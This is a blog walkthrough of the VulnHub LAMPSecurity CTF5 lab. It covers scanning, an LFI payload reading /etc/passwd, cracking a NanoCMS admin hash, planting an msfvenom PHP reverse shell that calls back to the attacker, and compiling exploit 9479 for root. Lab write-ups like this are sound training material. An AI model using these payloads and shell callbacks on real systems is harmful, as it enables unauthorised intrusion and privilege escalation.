<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the LAMPSecurity: CTF 5 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-lampsecurity-ctf-5-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2014-07-09T10:38:32+00:00">July 9, 2014</time><time class="updated" datetime="2025-06-10T20:30:46+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>LAMPSecurity CTF5 </strong>and it is another boot2root challenge provided for practice and its security level is for the beginners. So let’s try to break through it. But before please note that you can download it from here <a style="color: #000000;" href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/">https://www.vulnhub.com/entry/lampsecurity-ctf5,84/</a></span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies </strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">HTTP service enumeration</span></li>
<li><span style="color: #000000;">Identifying exploit for the vulnerable CMS Web application</span></li>
<li><span style="color: #000000;">Access CMS admin login page &amp; credentials</span></li>
<li><span style="color: #000000;">Generate PHP Backdoor (Msfvenom)</span></li>
<li><span style="color: #000000;">Upload and execute the backdoor</span></li>
<li><span style="color: #000000;">Reverse connection (Metasploit)</span></li>
<li><span style="color: #000000;">Import python one-liner for proper TTY shell</span></li>
<li><span style="color: #000000;">Exploiting target (exploit 9479)</span></li>
<li><span style="color: #000000;">Get the Root access</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>WalkThrough</u></strong></span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cqQ_LYEJqxc/W2622977mlI/AAAAAAAAZpU/Ly2Dkx3Ghb4AKwd_38--IEWlaVfHp5DtACEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We found our target –&gt; 192.168.1.145</span></p>
<p><span style="color: #000000;">Our next step is to scan our target with NMAP.</span></p>
<pre class="lang:default decode:true ">nmap -sV -p- 192.168.1.145</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tk_1fdGUazk/W2625MUvIUI/AAAAAAAAZpc/W74L3Vb_bMYYBx7HT0nuei2irhurd8mIQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">The NMAP output shows us that there are multiple ports opened. As HTTP service is also running, let’s begin with the same first and see what information we get.</span></p>
<p><span style="color: #000000;">Browsed the URL http://192.168.1.145 and we were greeted with Phake Organization heading banner, and with many options to navigate further.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-jiF_lOp-30U/W26257kQ96I/AAAAAAAAZpY/GzKDbW3rtGoDbslVHNUuIBZhmzjVv4O9QCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Let’s run Nikto tool here to find out more information</span></p>
<pre class="lang:default decode:true">nikto –h 192.168.1.145</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D-tYXlTZRSk/W2626HpfQvI/AAAAAAAAZpo/RPsXDLqdKbYwSzouBORjJD9JOXqbwTaBQCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As we can see that the victim machine is prone to LFI/RFI vulnerability.</span></p>
<p><span style="color: #000000;">Now we will paste this malicious code (as highlighted above), in the URL as follows to exploit LFI vulnerability using the browser</span></p>
<pre class="lang:default decode:true">http://192.168.1.145/index.php?page=../../../../../../../../../etc/passwd%00</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lrGqzWxjwxA/W2626OZzWPI/AAAAAAAAZpo/6IO7qujq2wIlvcSakIpOVWXxbFRHrtrQwCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">As we can see from the output above, we have successfully received the output of /etc/passwd in the browser. We can use this content at some time later in the lab (if required)</span></p>
<p><span style="color: #000000;">Click on the Blog tab of the website http://192.168.1.145 and it will redirect us to the URL http://192.168.1.145/~andy/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h-VJgdTRd4k/W2626RSeqHI/AAAAAAAAZpc/st3yoVsAE3sR5TjW1y5qgKXy9ARkp2s1ACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We got a clue from Andy Carp’s blog that the site is powered by NanoCMS. NanoCMS is a lightweight CMS based on PHP that is now discontinued. Therefore we searched on the possible vulnerabilities associated with Nano CMS on the internet and was able to get the details from the following URL https://www.securityfocus.com/bid/34508/exploit</span></p>
<p><span style="color: #000000;">The possible vulnerability identified is Password Hash Information Disclosure which allows unrestricted access to the path <strong>/data/pagesdata.txt</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bbe9ELA3NOg/W2626kbjDSI/AAAAAAAAZpg/L-xxecSChNQyA5C6MleHulx5UBLI6a8PACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Let’s try to append the <strong>/data/pagesdata.txt</strong> with http://192.168.1.145/~andy/ and navigate to the URL http://192.168.1.145/~andy/data/pagesdata.txt.The following content will be seen which contains a lot of information. Upon further investigation we found that the Admin password hash is retrieved.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FaMVbBvmTY0/W26266u7gSI/AAAAAAAAZpg/mEdIPS6vpPYlqh_QeOrtsYV8V69eAa8nwCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Open the website www.hashkiller.co.uk and decode the MD5 password hash received from above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_K2ORARSQsk/W262625smMI/AAAAAAAAZpk/fWqWFo-hbu8qz_P0sDeZzL1SRwwrASj0gCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">As seen the output “shannon” is the password extracted for the user admin.</span></p>
<p><span style="color: #000000;">Navigate to URL </span></p>
<pre class="lang:default decode:true">http://192.168.1.145/~andy/page</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XloVHWBT618/W26223rJ5bI/AAAAAAAAZpU/u8IWoNQwQDgi6zvTQZ0cnGVFzm2ATaOtgCEwYBhgL/s1600/10.JPG"/></span></p>
<p><span style="color: #000000;">Click on the Admin login sub-heading under the Login and we will be redirected to </span></p>
<pre class="lang:default decode:true">http://192.168.1.145/~andy/data/nanoadmin.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2pnB0Vk_D5U/W2623fru38I/AAAAAAAAZpo/BNmH4dhHxLAiFm5XPLSsHqenXjeW9lwbQCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Input the credentials in the Admin login page as follows :</span></p>
<pre class="lang:default decode:true">Username: admin
Password : shannon</pre>
<p><span style="color: #000000;">Upon success, the following page will appear</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nV3eAUcJbxU/W2623qmm8VI/AAAAAAAAZpU/YIEFqtOb_y0H75y-GrI6KwycgG7CWABcQCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Click on the <strong>New page</strong> options tab where we should be able to add new content with our own PHP code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-arkhokcTCaA/W2623g19HXI/AAAAAAAAZpc/tCbNxBXMDzUM621rT6re96HD8BJ_weLWgCEwYBhgL/s1600/13.JPG"/></span></p>
<p><span style="color: #000000;">Let’s generate a Reverse PHP shell with the following command</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.134 lport=4444 -f raw</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-c2dwSLuih7M/W26237-EQaI/AAAAAAAAZpc/zViymxSyyT0B1S70e_qyDNGXLqKDIc5kgCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;"><strong>Copy</strong> the code from <strong>&lt;?php to die() </strong>as shown above . Open the NanoCMS Admin panel of the website, navigate to the New Page option and paste the reverse PHP shell in the Content section. Input any name in the Title and click on the Add Page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-UeT1RmegcNA/W2624vVvC3I/AAAAAAAAZpg/r27FiiOJbqU5aGChbZWbiuUSqVFbo_UTgCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Upon clicking on the Add page, the file “shell” has been uploaded successfully, as seen in the screenshot below (under Navigation)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hGFp-T412vc/W2624qbxc-I/AAAAAAAAZpU/WwoExRTIl_sNFBCKuF2zbLEDNbjFtFpQwCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now in parallel, open the Metasploit console and perform the following</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.1.134
msf exploit(handler) &gt; set lport 4444
msf exploit(handler) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HpcdZJLczvc/W2624d54rUI/AAAAAAAAZpk/htsG44ogO8IqKNCFLtfKqJFM_S78wVbrACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Once we have started the listener on the Kali Linux, click on the <strong>shell </strong>file in Andy Carp’s blog. As soon as we click the same, we will get a meterpreter console. From the below image we can observe Meterpreter session 1. But our task is not finished yet, we still need to penetrate further for the privilege escalation.</span></p>
<p><span style="color: #000000;">Using <strong>sysinfo</strong> command, we found machine architecture details which may eventually help us to find out the kernel exploit for privilege escalation</span></p>
<p><span style="color: #000000;"><strong>sysinfo</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wDCPtgXJnts/W2624_IoI3I/AAAAAAAAZpk/gTwHE7NfrnMDsezGRzF983bV64J3ixE_QCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Searched across the internet to found the privilege escalation exploit that might apply to the Linux kernel version 2.6.23.1-42 and found the below link (as shown in the image above).</span></p>
<pre class="lang:default decode:true">https://www.exploit-db.com/exploits/9479</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Df7e_HwOy54/W2625B6eTRI/AAAAAAAAZpc/K0oJrMg-vXAGpRl-RaLTqEhIkBvzKUKxACEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">As we know that version of the kernel is vulnerable, we will download its exploit to the Kali machine from the Exploit DB website, as shown below:</span></p>
<pre class="lang:default decode:true">wget https://www.exploit-db.com/download/9479.c</pre>
<p><span style="color: #000000;">Moving forward, we will compile the file as follows:</span></p>
<pre class="lang:default decode:true">gcc -m32 -o exploit 9479.c</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mc-_FZBK4Jw/W2625TpuGfI/AAAAAAAAZpU/RyzR_nI02EU-SEQKkxjcLzpXPWFsA-TgQCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now go back to the Meterpreter session and navigate to <strong>/tmp</strong> folder</span></p>
<pre class="lang:default decode:true ">cd /tmp</pre>
<p><span style="color: #000000;">Send the exploit file from Kali machine Meterpreter session to the target system</span></p>
<pre class="lang:default decode:true">upload /root/exploit exploit</pre>
<p><span style="color: #000000;">Further, navigate to shell</span></p>
<pre class="lang:default decode:true">shell</pre>
<p><span style="color: #000000;">In order to access proper TTY shell, we had imported python one line script by typing following:</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">We got the limited shell!! Now let’s try to enumerate further</span></p>
<p><span style="color: #000000;">Proceed forward and go to the tmp folder by typing :</span></p>
<pre class="lang:default decode:true">cd /tmp</pre>
<p><span style="color: #000000;">Let’s see what directories it has and for that type:</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;">Assign the permissions to the exploit, before execution</span></p>
<pre class="lang:default decode:true">chmod 777 exploit</pre>
<p><span style="color: #000000;">Then type the following command to execute the exploit:</span></p>
<pre class="lang:default decode:true">env- ./exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HIxCYFNSpAQ/W2625loOCbI/AAAAAAAAZpY/XRf8XL8OQmoVd-bTITFcASaHI6pjKKR0wCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">As soon the exploit executes we will get the root access!!</span></p>
<p><span style="color: #000000;">And to confirm this type:</span></p>
<pre class="lang:default decode:true">id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--bwUuUD0OLc/W2625qe4C8I/AAAAAAAAZpk/wsRnQOpVTYEJibPpRON2Wddko7tF_jXKACEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Hurray!! We have successfully solved this challenge.</span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong><br/>
</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
